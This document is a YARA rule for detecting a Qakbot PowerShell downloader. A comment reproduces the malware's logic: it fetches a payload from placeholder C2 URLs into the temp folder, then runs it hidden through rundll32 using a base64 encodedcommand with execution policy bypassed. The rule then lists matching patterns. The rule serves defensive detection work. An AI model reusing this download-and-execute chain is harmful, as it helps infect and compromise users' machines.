rule Classification_Qakbot_Powershell_Downloader: T1059_001
{
    meta:
        tlp = "green"
        author = "Jeremy Humble"
        date = "2023-04-19"
        description = "Qakbot"
        references = ""
        hashes = ""
        scope = "detection"
        platform = "ICET"

    strings:
        /*
            Start-Sleep -Seconds 4;
            $Ionics = ("<c2_url1>,<c2_url2>,<c2_url3>...").split(",");
            foreach ($Deserve in $Ionics) 
            {
                try 
                {   
                    wget $Deserve -TimeoutSec 16 -O $env:TEMP\Porose.upslantHypervitaminosis;
                    if ((Get-Item $env:TEMP\Porose.upslantHypervitaminosis).length -ge 100000) 
                    {   
                        powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand "cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXABQAG8AcgBvAHMAZQAuAHUAcABzAGwAYQBuAHQASAB5AHAAZQByAHYAaQB0AGEAbQBpAG4AbwBzAGkAcwAsAE0AbwB0AGQAOwA=";
                        break;
                    }                                                                                                                                                                                                                                                                                                                                                      
                }   
                catch 
                {   
                    Start-Sleep -Seconds 4;
                }   
            }
        */
        $unencoded_sleep = /Start-Sleep -Seconds [0-9]/ nocase wide ascii
        $unencoded_download = /(curl|wget|Invoke-WebRequest|iwr).{,32}-TimeoutSec\s+[0-9]/ nocase wide ascii
        $unencoded_temp = "$env:TEMP\\" nocase wide ascii
        $unencoded_length_check = /\.length\s{1,16}-ge\s{1,16}100000/ nocase wide ascii
        $unencoded_catch = /catch\s{,16}\{\s{,16}Start-Sleep/ nocase wide ascii
        $unencoded_run0 = "rundll" nocase wide ascii
        $unencoded_run1 = "encodedcommand" nocase wide ascii
        
        $b64_sleep = "Start-Sleep" base64 base64wide
        $b64_encoded_command = "encodedcommand" base64 base64wide
        $b64_foreach = "foreach" base64 base64wide
        $b64_length = "-ge 100000" base64 base64wide
        $b64_temp = "$env:TEMP" base64 base64wide

        // base64wide catches utf16-le encoded base64 strings, but not utf16-le strings that have been base64 encoded. Since BB is doing the latter, we need these ugly checks
        $wide_b64_sleep = "S\x00t\x00a\x00r\x00t\x00-\x00S\x00l\x00e\x00e\x00p\x00" base64 base64wide
        $wide_b64_encoded_command = "e\x00n\x00c\x00o\x00d\x00e\x00d\x00c\x00o\x00m\x00m\x00a\x00n\x00d\x00" base64 base64wide
        $wide_b64_foreach = "f\x00o\x00r\x00e\x00a\x00c\x00h\x00" base64 base64wide
        $wide_b64_length = "-\x00g\x00e\x00 \x001\x000\x000\x000\x000\x000\x00" base64 base64wide
        $wide_b64_temp = "$\x00e\x00n\x00v\x00:\x00T\x00E\x00M\x00P\x00" base64 base64wide
    
        $clsid0 = "adb880a6-d8ff-11cf-9377-00aa003b7a11" nocase wide ascii
        $clsid1 = "52A2AAAE-085D-4187-97EA-8C30DB990436" nocase wide ascii
        $cmd = /value\s{,16}=\s{,16}".{,16}(cmd.exe|powershell.exe)/ nocase wide ascii
        


    condition:
        (
            any of ($clsid*) and
            $cmd
        ) or
        5 of ($unencoded*) or
        2 of ($b64*) or
        2 of ($wide*)
}